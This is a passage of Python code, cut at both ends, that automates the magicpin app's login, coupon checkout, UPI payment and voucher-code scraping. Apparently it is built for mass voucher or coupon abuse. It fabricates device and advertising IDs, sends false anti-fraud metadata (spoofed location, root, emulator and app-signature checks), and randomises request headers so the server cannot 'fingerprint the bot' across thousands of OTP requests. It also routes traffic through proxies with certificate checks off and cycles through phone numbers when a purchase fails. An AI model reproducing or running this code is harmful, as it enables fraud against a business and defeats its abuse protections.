        gaid_seed = int(hashlib.sha256(f"{phone}_gaid".encode()).hexdigest(), 16)
        gaid = str(uuid.UUID(int=gaid_seed % (2 ** 128), version=4))

    return {
        "device_id":    did,
        "manufacturer": prof["manufacturer"],
        "model":        prof["model"],
        "gaid":         gaid,
        "name":         prof["name"],
    }


def normalize_phone(p: str) -> str:
    p = p.strip().replace("+", "").replace(" ", "").replace("-", "")
    if p.startswith("91") and len(p) == 12:
        return p
    if len(p) == 10:
        return "91" + p
    return p


def nonce(n: int = 16) -> str:
    abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(secrets.choice(abc) for _ in range(n))


def base_headers(token: str = "", uid: str = "", theme: str = "light") -> dict:
    return {
        "selected-lon": LON, "lon": LON, "package-name": PKG,
        "auth-userid": str(uid), "device-width": "600",
        "device-height": "1066", "auth-user-token": token,
        "selected-lat": LAT, "user-country": "IN",
        "version-code": str(VER), "device-scale-factor": "1.5",
        "theme": theme, "is-device-rooted": "false",
        "lang": "en", "helpdesk-version": "8", "lat": LAT,
        "content-type": "application/json; charset=UTF-8",
        "accept-encoding": "gzip", "user-agent": "okhttp/4.12.0",
    }


def cookie_str(token: str, uid: str, theme: str = "light") -> str:
    parts = {
        "selected-lon": LON, "lon": LON, "package-name": PKG,
        "auth-userid": str(uid), "device-width": "600",
        "device-height": "1066", "auth-user-token": token,
        "selected-lat": LAT, "user-country": "IN",
        "version-code": str(VER), "device-scale-factor": "1.5",
        "theme": theme, "is-device-rooted": "false", "lang": "en",
        "helpdesk-version": "8", "lat": LAT,
    }
    return "; ".join(f"{k}={v}" for k, v in parts.items())


def _api_headers(token: str, uid: str) -> dict:
    return {
        "auth-user-token": token, "auth-userid": str(uid),
        "package-name": PKG, "version-code": str(VER),
        "user-country": "IN", "lang": "en",
        "accept-encoding": "gzip", "user-agent": "okhttp/4.12.0",
        "content-type": "application/json; charset=UTF-8",
    }


def _ledger_headers(token: str, uid: str) -> dict:
    return {
        "selected-lon": LON, "lon": LON, "package-name": PKG,
        "auth-userid": str(uid), "device-width": "600",
        "device-height": "1066", "auth-user-token": token,
        "selected-lat": LAT, "user-country": "IN",
        "version-code": str(VER), "device-scale-factor": "1.5",
        "theme": "light", "is-device-rooted": "false",
        "lang": "en", "helpdesk-version": "8", "lat": LAT,
        "accept-encoding": "gzip", "user-agent": "okhttp/4.12.0",
    }


def _pg_headers(txn: str) -> dict:
    return {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://pg.magicpin.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": f"https://pg.magicpin.com/page/{txn}/startpayment",
        "accept-language": "en-IN,en;q=0.9",
        "user-agent": _pick_pg_ua(),
        "cookie": f"rzp_unified_session_id={nonce(12)}",
    }


_INDIAN_CARRIERS = ["Jio", "Airtel", "Vi"]

def build_metadata(device: dict) -> dict:
    jlat, jlon = _jitter_location()
    local_ip = f"192.168.{random.randint(0, 254)}.{random.randint(1, 254)}"
    carrier   = random.choice(_INDIAN_CARRIERS)
    return {
        "locationInfo": (
            '{\n  "isLocationSpoofed": false,\n'
            f'  "currentLongitude": "{jlon}",\n'
            '  "isNetworkProviderEnabled": true,\n'
            f'  "currentLatitude": "{jlat}",\n'
            '  "isGpsProviderEnabled": true,\n'
            '  "isSessionFreshLocationFetched": true\n}'
        ),
        "appEnvironmentInfo": (
            '{\n  "is_unverified_app": false,\n'
            '  "is_device_rooted": false,\n'
            '  "is_network_operator_absent": false,\n'
            '  "is_cloned_app": false,\n'
            '  "is_device_emulator": false,\n'
            '  "encrypted_apk_signature": "SJX+9pGcvl2+yjn/SE9AXQ==$+Gw+RyuIfqt62Jn4Q1iC0NFmIWzA3GG7lw04TJ7euiG8sqqtrjqfvEKNAsxop7kJb6JimnFlaY8VN/QeOOfYOuSdsdy7QUvCeCLaMumW9BjxzX5OhUSKMVqKDY9ckJ8l",\n'
            '  "is_sim_absent": false\n}'
        ),
        "session_id": f"{uuid.uuid4()}-{int(time.time()*1000)}",
        "deviceDto": (
            '{\n  "deviceId": "' + device["device_id"] + '",\n'
            '  "deviceManufacturer": "' + device["manufacturer"] + '",\n'
            '  "deviceModel": "' + device["model"] + '",\n'
            '  "ipAddress": "' + local_ip + '",\n'
            '  "networkCarrier": "' + carrier + '"\n}'
        ),
    }


def query_params() -> str:
    return json.dumps({
        "campaign_utm_source": "shop", "pageSource": "wallet",
        "roaid": VOUCHER_ID, "utm_source": "shop",
    })


def _is_ssl_eof(exc: BaseException) -> bool:
    """Detect SSL EOF — proxy dropped connection mid-handshake."""
    msg = str(exc).lower()
    return any(s in msg for s in (
        "unexpected_eof_while_reading", "eof occurred in violation of protocol",
        "ssl: unexpected_eof", "ssleoferror", "wrong version number",
    ))


def _req(method: str, url: str, proxies=None, **kwargs):
    kwargs.setdefault("timeout", 25)
    kwargs["proxies"] = proxies
    kwargs.setdefault("verify", False)  # verify=False — magicpin SSL needs this

    proxy_label = (proxies.get("http") if proxies else None) or "Direct"
    log.info(f"🌐 Request {method} {url[:50]} | Proxy: {proxy_label}")

    last_err = None
    for attempt in range(3):
        try:
            return requests.request(method, url, **kwargs)
        except (requests.exceptions.ProxyError,
                requests.exceptions.ConnectionError,
                requests.exceptions.Timeout,
                requests.exceptions.SSLError,
                OSError) as e:
            last_err = e
            log.warning(f"_req {method} {url[:60]} attempt {attempt+1}/3: {e}")
            time.sleep(0.8 * (attempt + 1))
    raise last_err  # type: ignore


_OKHTTP_VERSIONS = ["4.10.0", "4.11.0", "4.12.0", "4.12.1"]
_APP_VERSIONS    = [1216, 1217, 1218, 1219, 1220]
_APP_VERNAMES    = ["1.119.0", "1.119.1", "1.119.2", "1.120.0", "1.120.2"]


def _random_otp_headers() -> dict:
    """
    Build slightly randomised OTP request headers.
    Prevents the server from fingerprinting the bot via a constant UA string
    or a constant version-code across thousands of OTP requests.
    """
    okv   = random.choice(_OKHTTP_VERSIONS)
    appv  = random.choice(_APP_VERSIONS)
    vname = random.choice(_APP_VERNAMES)
    return {
        "package-name":    PKG,
        "version-code":    str(appv),
        "user-country":    "IN",
        "lang":            "en",
        "accept-encoding": "gzip",
        "user-agent":      f"okhttp/{okv}",
        "content-type":    "application/json; charset=UTF-8",
        "x-request-id":    str(uuid.uuid4()),
        "_vername_internal": vname,   # pulled out before sending
        "_appv_internal":    appv,
    }


def send_otp(phone: str, headers: dict, proxies=None) -> Tuple[bool, bool, dict]:
    """
    Returns (success_bool, rate_limited_bool, fingerprint_dict).

    fingerprint_dict contains the exact ver/vername/ua used for this OTP request.
    THE LOGIN CALL MUST USE THE SAME FINGERPRINT — mismatching them causes 401.

    Root cause of 401 bug:
      OTP was sent with e.g. ver=1214, ua=okhttp/4.12.1
      login() was called with ver=1215, ua=okhttp/4.12.0 (from base_headers())
      Magicpin server ties the OTP to the exact client that requested it → 401.
    """
    h = _random_otp_headers()
    vname = h.pop("_vername_internal")
    appv  = h.pop("_appv_internal")

    # Save the fingerprint so the caller can pass it into login()
    fingerprint = {
        "version_code": str(appv),
        "vername":      vname,
        "user_agent":   h["user-agent"],
    }

    log.info(f"SendOtp → {phone}  ua={h['user-agent']}  ver={appv}")
    try:
        r = _req(
            "POST",
            "https://auth.magicpin.in/SendOtp/V2/",
            proxies=proxies,
            headers=h,
            json={
                "phone_no":          phone,
                "sms_service_flag":  "0",
                "app-version-name":  vname,
                "app-version":       appv,
            },
            timeout=20,
        )
        log.info(f"HTTP {r.status_code}: {r.text[:120]}")
        if r.status_code == 429:
            return False, True, {}
        if r.status_code == 200:
            try:
                d = r.json()
                if "max rate limit breached" in r.text.lower() or d.get("msg") == "max rate limit breached":
                    return False, True, {}
            except Exception:
                pass
            return True, False, fingerprint
        return False, False, {}
    except Exception as e:
        log.warning(f"SendOtp error: {e}")
        return False, False, {}


def login(phone: str, otp: str, headers: dict, device: dict, proxies=None,
          fingerprint: dict = None) -> Optional[dict]:
    """
    fingerprint: dict returned by send_otp() — must contain same ver/ua.
    If None, falls back to global VER/VERNAME (only safe for manual flow).
    """
    ts  = str(int(time.time() * 1000))
    nc  = nonce()
    tok = hashlib.md5(f"{device['device_id']}{ts}{nc}".encode()).hexdigest()
    inner = {
        "apiParams": {"utmSource": "google-play", "utmMedium": "organic"},
        "callOtp": False,
        "device_id": device["device_id"],
        "device_manufacturer": device["manufacturer"],
        "device_model": device["model"],
        "googleAdvertisingId": device["gaid"],
        "installDeeplinkParams": json.dumps(
            {"utm_medium": ["organic"], "utm_source": ["google-play"]}, indent=2
        ),
        "is_rooted": False,
        "login_method": "",
        "nonce": nc,
        "otp": otp,
        "prefilledOtp": False,
        "prefilledPhone": False,
        "timestamp": ts,
        "phone_number": phone,
    }
    hexd = json.dumps(inner, separators=(",", ":")).encode().hex()
    sig  = hashlib.sha256(f"{phone}{otp}{nc}{ts}{tok}".encode()).hexdigest()
    body = {
        "apiParams": {"utmSource": "google-play", "utmMedium": "organic"},
        "callOtp": False,
        "data": hexd,
        "device_id": device["device_id"],
        "device_manufacturer": device["manufacturer"],
        "device_model": device["model"],
        "googleAdvertisingId": device["gaid"],
        "installDeeplinkParams": json.dumps(
            {"utm_medium": ["organic"], "utm_source": ["google-play"]}, indent=2
        ),
        "is_rooted": False,
        "login_method": "",
        "nonce": nc,
        "otp": otp,
        "prefilledOtp": False,
        "prefilledPhone": False,
        "signature": sig,
        "timestamp": ts,
        "token": tok,
        "phone_number": phone,
    }
    # Build login headers that EXACTLY match the OTP fingerprint
    # Using a different ver/ua than what was used in send_otp → 401
    _ver  = str(fingerprint["version_code"]) if fingerprint else str(VER)
    _ua   = fingerprint["user_agent"]        if fingerprint else "okhttp/4.12.0"
    _vname = fingerprint["vername"]          if fingerprint else VERNAME
    login_headers = {
        **headers,
        "version-code": _ver,
        "user-agent":   _ua,
        # vername goes in the body json, not headers — already set above via VER
        # but we override it in the body too for full consistency
    }
    # Patch vername into body fields as well
    body["app-version-name"] = _vname
    body["app-version"]      = int(_ver)

    log.info(f"Login  ver={_ver}  ua={_ua}")
    try:
        r = _req(
            "POST",
            "https://webapi.magicpin.in/ultron-aryan/login/",
            proxies=proxies,
            headers=login_headers,
            json=body,
            timeout=25,
        )
        log.info(f"HTTP {r.status_code}")
        d = r.json()
        if d.get("status") == "SUCCESS":
            return d
        msg = d.get("message") or d.get("status") or "login failed"
        log.warning(f"Login FAILURE: {msg} | {json.dumps(d, indent=2)[:400]}")
        d["_error"] = msg
        return d
    except Exception as e:
        log.warning(f"Login error: {e}")
        return {"status": "FAILURE", "_error": str(e)}


def checkout(phone: str, token: str, uid: str, first_name: str, email: str,
             device: dict, proxies=None):
    url  = "https://pay.magicpin.in/voucher/checkout"
    body = {
        "metadata": build_metadata(device),
        "userCoupon": "",
        "data": {
            "VOUCHER": [{
                "items": [{"id": VOUCHER_ID, "quantity": 1, "selected": True}],
                "merchantUserId": MERCHANT,
            }],
            "MAGICPRO": [{
                "items": [{"id": "1", "quantity": 0, "selected": False, "type": "MAGICPRO"}],
            }],
            "MAGIC_CREDIT_SELECTED": [{
                "items": [{
                    "id": "MAGIC_CREDIT_SELECTED",
                    "quantity": 0,
                    "selected": False,
                    "type": "MAGIC_CREDIT_SELECTED",
                }],
                "merchantUserId": MERCHANT,
            }],
        },
        "queryParams": query_params(),
        "clone_app_package_count": 1,
        "cartId": "",
        "upiAvailable": "",
        "application_id": PKG,
        "phoneNo": phone,
        "firstName": first_name,
        "isLocationSpoofed": False,
        "package_name": PKG,
        "crossSellAdded": False,
        "merchantUserId": "",
        "showUpsellBottomSheet": True,
        "email": email,
    }
    log.info("Checkout")
    try:
        r = _req("POST", url, proxies=proxies, headers=base_headers(token, uid),
                 json=body, timeout=30)
        log.info(f"HTTP {r.status_code}")
        raw = r.text.strip() if r.text else ""
        if not raw:
            log.warning(f"Checkout empty response body (HTTP {r.status_code})")
            return {}, None
        try:
            d = r.json()
        except Exception as json_err:
            log.warning(f"Checkout non-JSON response (HTTP {r.status_code}): {raw[:300]} | {json_err}")
            return {}, None
        ci     = (d.get("data") or {}).get("userCouponInfo") or {}
        pg_amt = (d.get("data") or {}).get("pgAmount")
        log.info(f"coupon : {ci.get('status')} - {ci.get('message')}")
        log.info(f"pgAmt  : {pg_amt}")
        try:
            pg_amt = float(pg_amt)
        except (TypeError, ValueError):
            pg_amt = None

        # UPI payment gateways (Paytm, PhonePe, GPay) reject any collect
        # request below ₹1.00 — they return status=FAILURE with an empty
        # upiUri.  Magicpin sometimes prices the voucher at ₹0.99 after
        # coupon discount.  Round up to ₹1.00 so the UPI intent always fires.
        if pg_amt is not None and pg_amt < 1.00:
            log.info(f"pgAmt {pg_amt} < ₹1.00 — rounding up to 1.00 (UPI minimum)")
            pg_amt = 1.00

        return d, pg_amt
    except Exception as e:
        log.warning(f"Checkout error: {e}")
        raise


def payoutapp(phone: str, token: str, uid: str, first_name: str, email: str,
              amount: float, device: dict, proxies=None) -> Optional[str]:
    url  = "https://pg.magicpin.com/pg/page/payment/payoutapp"
    body = {
        "firstName": first_name,
        "phone": phone,
        "email": email,
        "amount": amount,
        "userId": str(uid),
        "accessToken": token,
        "type": "wallet",
        "userType": "CUSTOMER",
        "paymentMotive": "VOUCHER_PURCHASE",
        "upiAvailable": UPI_LIST,
        "deviceDto": {
            "deviceManufacturer": device["manufacturer"],
            "deviceModel": device["model"],
            "networkCarrier": "--",
            "ipAddress": "",
        },
        "isCredInstalled": False,
        "isGojekInstalled": False,
        "couponData": {
            "metadata": build_metadata(device),
            "data": {
                "MAGIC_CREDIT_SELECTED": [{
                    "merchantUserId": MERCHANT,
                    "items": [{
                        "type": "MAGIC_CREDIT_SELECTED",
                        "id": "MAGIC_CREDIT_SELECTED",
                        "quantity": 0,
                        "selected": False,
                    }],
                }],
                "VOUCHER": [{
                    "merchantUserId": MERCHANT,
                    "items": [{"id": VOUCHER_ID, "quantity": 1, "selected": True}],
                }],
            },
            "userCoupon": COUPON,
            "phoneNo": phone,
            "email": email,
            "firstName": first_name,
            "queryParams": query_params(),
            "removeAutoApplyCouponCode": False,
            "crossSellAdded": False,
            "isLocationSpoofed": False,
            "showUpsellBottomSheet": True,
            "merchantUserId": MERCHANT,
            "upiAvailable": UPI_LIST.replace(",", ", "),
            "roaId": VOUCHER_ID,
            "magicpinAmount": 0,
            "pgAmount": amount,
            "magicProSubscriptionId": "",
            "paymentMotive": "VOUCHER_PURCHASE",
            "transactionType": "redemption",
            "phone": phone,
            "phone_no": phone,
            "lat": float(LAT),
            "lon": float(LON),
            "mp-authorization": token,
            "app-version": "2379",
            "app-version-name": "IOS-4.7.54",
            "country": "IN",
            "userId": str(uid),
            "useMPWallet": 1,
        },
    }
    h = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "origin": "null",
        "user-agent": P_UA,
        "content-type": "application/json",
        "accept-language": "en-IN,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
    }
    log.info(f"Payoutapp  amount={amount}")
    try:
        r = _req("POST", url, proxies=proxies, headers=h, data=json.dumps(body),
                 allow_redirects=False, timeout=30)
        log.info(f"HTTP {r.status_code}")
        loc = r.headers.get("Location") or ""
        log.info(f"Location: {loc}")
        if "payment_status=failure" in loc or "Something went wrong" in loc:
            log.warning("Payoutapp failure deep-link — will try next number")
            return None
        # Handle both https:// and magicpin:// deep-link schemes
        # Pattern 1: https://pg.magicpin.com/page/<txn>/startpayment
        m = re.search(r"/page/([0-9a-f]{16,32})/startpayment", loc)
        if m:
            return m.group(1)
        # Pattern 2: magicpin://payment?txnId=<txn> or similar query params
        m = re.search(r"[?&]txn(?:Id|_id|ID)?=([0-9a-f]{16,32})", loc)
        if m:
            return m.group(1)
        # Pattern 3: any 16-32 hex chars that look like a transaction ID
        m = re.search(r"\b([0-9a-f]{16,32})\b", loc)
        if m and "payment_status" not in loc:
            log.info(f"Payoutapp txn extracted via fallback pattern: {m.group(1)}")
            return m.group(1)
        log.warning(f"Payoutapp: could not extract txn from Location: {loc}")
        return None
    except Exception as e:
        log.warning(f"Payoutapp error: {e}")
        raise


def initiate_upi(txn: str, uid: str, phone: str, email: str, amount: float,
                 instrument: str = "Phonepe", parent: str = "paytm",
                 proxies=None) -> Optional[str]:
    body = {
        "mpTransactionId": txn,
        "userId": str(uid),
        "amount": amount,
        "parent": parent,
        "paymentMode": "UPI",
        "paymentInstrument": "UPI",
        "instrumentTitle": f"UPI-{instrument}",
        "pgCouponCode": False,
        "instrumentId": instrument,
        "userType": "CUSTOMER",
        "phoneNo": phone,
        "emailId": email,
        "magicCashSelected": False,
        "magicCashAmount": 0,
    }
    log.info(f"/pg/payment/initiate → {parent}/{instrument}  amount={amount}")
    try:
        r = _req("POST", PAY_INITIATE, proxies=proxies, headers=_pg_headers(txn),
                 json=body, timeout=30)
        log.info(f"HTTP {r.status_code}")
        raw = r.text.strip() if r.text else ""
        if not raw:
            log.warning(f"initiate_upi empty response (HTTP {r.status_code})")
            return None
        try:
            d = r.json()
        except Exception as json_err:
            log.warning(f"initiate_upi non-JSON (HTTP {r.status_code}): {raw[:300]} | {json_err}")
            return None
    except Exception as e:
        log.warning(f"initiate_upi error: {e}")
        raise
    uri = d.get("upiUri") or ""
    if uri and not uri.startswith("upi://"):
        uri = "upi://pay?" + uri.lstrip("?")
    log.info(f"status={d.get('status')}  parent={d.get('parent')}  upiUri={uri}")
    return uri


def list_saved_card_ids(token: str, uid: str, proxies=None) -> Set[str]:
    url = f"https://pg.magicpin.com/cards/payment/addStoredCardsToList/{uid}"
    h   = {
        "accept": "application/json",
        "x-requested-with": PKG,
        "user-agent": "okhttp/4.12.0",
        "cookie": cookie_str(token, uid),
    }
    try:
        d = _req("GET", url, proxies=proxies, headers=h, timeout=20).json()
    except Exception:
        return set()
    cards = (
        (d.get("storeCardList") or [])
        or ((d.get("data") or {}).get("storeCardList") or [])
        or ((d.get("data") or {}).get("cards") or [])
    )
    if not cards and isinstance(d.get("data"), list):
        cards = d["data"]
    ids = set()
    for c in cards or []:
        if isinstance(c, dict):
            cid = c.get("id") or c.get("cardId") or c.get("card_id")
            if cid is not None:
                ids.add(str(cid))
    return ids


def delete_card(card_id: str, token: str, uid: str, proxies=None):
    url = "https://pg.magicpin.com/pg/payment/deleteStoredCard"
    h   = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://pg.magicpin.com",
        "x-requested-with": PKG,
        "user-agent": "okhttp/4.12.0",
        "cookie": cookie_str(token, uid),
    }
    body = {"cardId": card_id, "userId": str(uid)}
    log.info(f"deleting card {card_id}...")
    r = _req("POST", url, proxies=proxies, headers=h, data=json.dumps(body), timeout=20)
    log.info(f"HTTP {r.status_code}  {r.text[:200]}")


def _ledger_call(token: str, uid: str, next_cursor: str = "0",
                 filter_val: str = "", page_source=None, if_modified_since=None,
                 proxies=None):
    params = {"next": str(next_cursor), "filter": filter_val}
    if page_source:
        params["pageSource"] = page_source
    else:
        params["is_helpdesk_item_selection_page"] = "false"
        params["client"] = ""
    h = _ledger_headers(token, uid)
    if if_modified_since:
        h["if-modified-since"] = if_modified_since
    try:
        r = _req("GET", LEDGER_URL, proxies=proxies, headers=h, params=params, timeout=25)
        log.info(
            f"GET next={next_cursor} filter={filter_val!r} "
            f"pageSource={page_source!r} → HTTP {r.status_code}"
        )
        if r.status_code not in (200, 304):
            return None, None
        if r.status_code == 304 or not r.text.strip():
            return {}, r.headers.get("last-modified")
        return r.json(), r.headers.get("last-modified")
    except Exception as e:
        log.warning(f"ledger: {e}")
        return None, None


def _walk_cards(o, out):
    if isinstance(o, dict):
        if o.get("type") == "transaction-info-card":
            out.append(o)
        for v in o.values():
            _walk_cards(v, out)
    elif isinstance(o, list):
        for i in o:
            _walk_cards(i, out)


def ledger_all_voucher_cards(token: str, uid: str, max_pages: int = 3, proxies=None) -> list:
    all_cards = []
    d, _ = _ledger_call(token, uid, next_cursor="0", filter_val="",
                        page_source="account", proxies=proxies)
    if d:
        cards = []
        _walk_cards(d.get("data") or [], cards)
        all_cards += cards
        cursor = d.get("next")
    else:
        cursor = "1"

    page = 1
    while cursor and page <= max_pages:
        d, _ = _ledger_call(token, uid, next_cursor=str(page), filter_val="", proxies=proxies)
        if not d:
            break
        cards = []
        _walk_cards(d.get("data") or [], cards)
        all_cards += cards
        cursor = d.get("next")
        page += 1
        if not cursor:
            break

    log.info(f"ledger cards scanned: {len(all_cards)}")
    return all_cards


def ledger_newest_voucher_txn(token: str, uid: str, min_txn_id: int = 0,
                              max_pages: int = 3, proxies=None):
    cards = ledger_all_voucher_cards(token, uid, max_pages=max_pages, proxies=proxies)
    best_id, newest = -1, None
    for c in cards:
        if c.get("txn_status") != "BOUGHT":
            continue
        try:
            tid = int(c.get("transaction_id"))
        except (TypeError, ValueError):
            continue
        if tid > best_id:
            best_id, newest = tid, c
    if newest is None:
        return None, None
    tid = int(newest["transaction_id"])
    if tid <= int(min_txn_id):
        return None, None
    return tid, newest


def _text_val(o) -> Optional[str]:
    if o is None:
        return None
    if isinstance(o, str):
        s = o.strip()
        return s or None
    if isinstance(o, (int, float)):
        return str(o)
    if isinstance(o, dict):
        for k in ("value", "text", "title", "label", "code", "pin"):
            if k in o and o[k] is not None:
                t = _text_val(o[k])
                if t:
                    return t
    return None


# Exact strings that must never be accepted as a voucher code or pin.
# "pin" and "password" removed from junk — they're KEY names, not values.
_VOUCHER_JUNK = {
    "refresh", "copy", "share", "ok", "done", "submit", "cancel",
    "view", "details", "more", "help", "support", "claim", "redeem",
    "voucher", "gift", "code", "none", "null",
    "-", "—", "n/a", "na", "tbd", "paid successfully", "saved",
    "txn id", "flipkart", "amazon",
    # label/display strings that look like codes but aren't
    "voucher 1/1", "voucher1/1", "voucher 2/2", "voucher2/2",
    "1/1", "2/2", "3/3",
}

# Patterns that disqualify a string from being a voucher code
_JUNK_CODE_PATTERNS = re.compile(
    r"""
    ^(
        \d{1,2}/\d{1,2}        |   # ratio like "1/1", "2/3"
        voucher\s*\d            |   # "Voucher 1", "Voucher 2"
        gift\s*voucher          |   # "Gift Voucher"
        https?://               |   # URLs
        [a-z\s]{8,}             |   # long lowercase sentences (UI labels)
        \d{4}-\d{2}-\d{2}       |   # dates
        \d{2}:\d{2}             |   # times
        rs\.?\s*\d+             |   # rupee amounts
        ₹\d+                    |   # rupee symbol amounts
        worth\s                 |   # "worth Rs.10"
        gift\s                      # "Gift Card..."
    )
    """,
    re.I | re.VERBOSE,
)


def _looks_like_code(s: str) -> bool:
    """
    True only if s looks like a real alphanumeric voucher code.
    Much stricter than the original — rejects UI labels, ratios, sentences.
    """
    if not s:
        return False
    s = s.strip()

    # Length: real codes are 6–30 chars
    if len(s) < 6 or len(s) > 30:
        return False

    # Exact junk match
    if s.lower() in _VOUCHER_JUNK:
        return False

    # Pattern-based disqualifiers
    if _JUNK_CODE_PATTERNS.search(s):
        return False

    # Must not contain a slash (ratio/fraction indicator)
    if "/" in s:
        return False

    # Must not be a plain dictionary word (all alpha, no digits)
    # Real codes almost always contain at least one digit OR are mixed-case
    all_alpha = s.replace(" ", "").replace("-", "").isalpha()
    if all_alpha and len(s) > 8:
        return False

    # Must be mostly alphanumeric (allow hyphens and spaces in formatted codes)
    alnum = sum(c.isalnum() for c in s)
    if alnum < len(s) * 0.75:
        return False

    # Must contain at least one digit OR be a known all-caps format (e.g. ABCD1234)
    has_digit  = any(c.isdigit() for c in s)
    has_upper  = any(c.isupper() for c in s)
    has_lower  = any(c.islower() for c in s)
    # Pure lowercase with no digits is almost always a label, not a code
    if has_lower and not has_upper and not has_digit:
        return False

    return True


def _looks_like_pin(s: str) -> bool:
    """PIN is typically 4–8 digits, or occasionally 4–8 alphanumeric chars."""
    if not s:
        return False
    s = s.strip()
    if s.lower() in _VOUCHER_JUNK:
        return False
    if "/" in s:
        return False
    # Pure digits: 4–8 chars
    if s.isdigit() and 4 <= len(s) <= 8:
        return True
    # Alphanumeric: 4–12 chars, must have at least one digit
    if 4 <= len(s) <= 12 and any(c.isdigit() for c in s) and s.isalnum():
        return True
    return False


def _extract_voucher(v: dict, pg_txn: str) -> dict:
    """
    Extract voucher code, pin, merchant, value from the Magicpin post-txn JSON.

    Priority order for code extraction (highest → lowest):
      1. Explicit CODE_KEYS in the JSON (most reliable)
      2. Widget-type specific fields (voucher-code widget)
      3. Title/body heuristic (title says "code", body has the value)
      4. Regex scan of the raw blob
      5. Uppercase alphanumeric pattern scan (last resort)

    Pin uses _looks_like_pin() which only accepts digit or short alphanumeric
    strings — never UI label text.
    """
    merchant = value = code = pin = None
    code_candidates: List[str] = []   # accumulate all plausible codes, pick best at end

    CODE_KEYS = {
        "code", "vouchercode", "voucher_code", "couponcode", "coupon_code",
        "giftcode", "gift_code", "cardnumber", "card_number", "serial",
        "serialnumber", "serial_number", "redeemcode", "redeem_code",
        "barcodetext", "barcode_text", "vouchernumber", "cardcode",
        "egiftcode", "giftcardcode", "gc_code", "couponvalue",
    }
    PIN_KEYS = {
        "pin", "voucherpin", "voucher_pin", "cvv", "passcode",
        "securitycode", "security_code", "accesscode", "access_code",
        "mpin", "vpin",
    }
    MERCHANT_KEYS = {"merchant", "merchantname", "merchant_name", "brand", "brandname"}
    VALUE_KEYS = {
        "denomination", "facevalue", "face_value",
        "voucheramount", "voucher_amount",
    }

    def _try_set_code(candidate: str, priority: int = 0):
        """Add candidate to pool; higher priority wins at the end."""
        if candidate and _looks_like_code(candidate):
            code_candidates.append((priority, candidate))

    def _try_set_pin(candidate: str):
        nonlocal pin
        if pin:
            return
        if candidate and _looks_like_pin(candidate):
            pin = candidate

    def walk(o, depth=0):
        nonlocal merchant, value
        if depth > 60 or o is None:
            return
        if isinstance(o, dict):
            t = str(o.get("type") or o.get("widgetType") or o.get("widget_type") or "").lower()

            # ── Merchant ──────────────────────────────────────────
            if "voucher-details" in t or "details-widget" in t:
                md = o.get("merchant_details") or o.get("merchantDetails") or {}
                merchant = _text_val(md.get("title") or md.get("name")) or merchant
                merchant = _text_val(o.get("merchantName") or o.get("merchant")) or merchant

            # ── Value/denomination ────────────────────────────────
            if "voucher-header" in t or "header-widget" in t:
                v_txt = _text_val(o.get("title") or o.get("sub_title") or o.get("subtitle"))
                if v_txt and any(c.isdigit() for c in v_txt):
                    value = value or v_txt

            # ── voucher-code widget — highest priority source ─────
            if "voucher-code" in t or "code-widget" in t:
                # Try dedicated sub-keys first
                for ck in ("code", "voucherCode", "voucher_code", "barcodeText", "barcode_text", "serial"):
                    raw_v = o.get(ck)
                    if raw_v:
                        _try_set_code(_text_val(raw_v), priority=10)

                # title field in a code widget is the code itself
                title_v = _text_val(o.get("title"))
                if title_v:
                    _try_set_code(title_v, priority=9)

                # sub_title in a code widget is usually the PIN
                for pk in ("sub_title", "subtitle", "subTitle", "pin", "pinCode"):
                    raw_p = o.get(pk)
                    if raw_p:
                        _try_set_pin(_text_val(raw_p))

            # ── voucher-pin widget ────────────────────────────────
            if "voucher-pin" in t or "pin-widget" in t:
                for pk in ("pin", "code", "title", "value", "pinCode"):
                    raw_p = o.get(pk)
                    if raw_p:
                        _try_set_pin(_text_val(raw_p))

            # ── Generic key scan ──────────────────────────────────
            for k, raw in o.items():
                kl = str(k).lower().replace("-", "").replace("_", "").replace(" ", "")
                txt = _text_val(raw)
                if not txt or len(txt) > 64:
                    continue

                # Explicit code keys → priority 8
                if kl in CODE_KEYS:
                    _try_set_code(txt, priority=8)

                # Keys ending in "code" → priority 5
                elif kl.endswith("code") and "http" not in txt.lower():
                    _try_set_code(txt, priority=5)

                # Explicit pin keys
                if kl in PIN_KEYS:
                    _try_set_pin(txt)

                if kl in MERCHANT_KEYS and not merchant:
                    merchant = txt
                if kl in VALUE_KEYS and not value and any(c.isdigit() for c in txt):
                    value = txt

            # ── Title + body heuristic ────────────────────────────
            title_t = (_text_val(o.get("title") or o.get("label") or o.get("heading")) or "").lower()
            body_t  = _text_val(
                o.get("sub_title") or o.get("subtitle") or o.get("subTitle")
                or o.get("description") or o.get("text")
                or o.get("primary_text") or o.get("primaryText")
            )
            if body_t and len(body_t) <= 48:
                CODE_TITLE_SIGNALS = ("code", "coupon", "card number", "serial", "voucher no", "gc")
                PIN_TITLE_SIGNALS  = ("pin", "password", "passcode", "cvv", "security")
                if any(x in title_t for x in CODE_TITLE_SIGNALS):
                    _try_set_code(body_t, priority=6)
                if any(x in title_t for x in PIN_TITLE_SIGNALS):
                    _try_set_pin(body_t)

            # Recurse
            for v2 in o.values():
                walk(v2, depth + 1)

        elif isinstance(o, list):
            for item in o:
                walk(item, depth + 1)

    walk(v)

    # ── Regex fallback on raw blob ────────────────────────────────────────────
    try:
        blob = json.dumps(v)

        # Code: explicit key names
        for m in re.finditer(
            r'"(?:voucher_?[Cc]ode|coupon_?[Cc]ode|gift_?[Cc]ode|serial|card_?[Nn]umber|barcodeText|barcode_text|redeemCode)"\s*:\s*"([^"]{6,30})"',
            blob,
        ):
            _try_set_code(m.group(1), priority=7)

        # Pin: explicit key names
        if not pin:
            for m in re.finditer(
                r'"(?:voucher_?[Pp]in|vPin|mpin|pinCode|passcode|accessCode)"\s*:\s*"([^"]{3,12})"',
                blob,
            ):
                _try_set_pin(m.group(1))

        # Pin: bare "pin" key with digit-only value (most common)
        if not pin:
            for m in re.finditer(r'"pin"\s*:\s*"(\d{4,8})"', blob):
                _try_set_pin(m.group(1))

        # Code: uppercase alphanumeric pattern last resort (priority 1)
        for m in re.finditer(r'"([A-Z][A-Z0-9\-]{5,24})"', blob):
            cand = m.group(1)
            if _looks_like_code(cand) and not cand.isdigit():
                _try_set_code(cand, priority=1)

    except Exception:
        pass

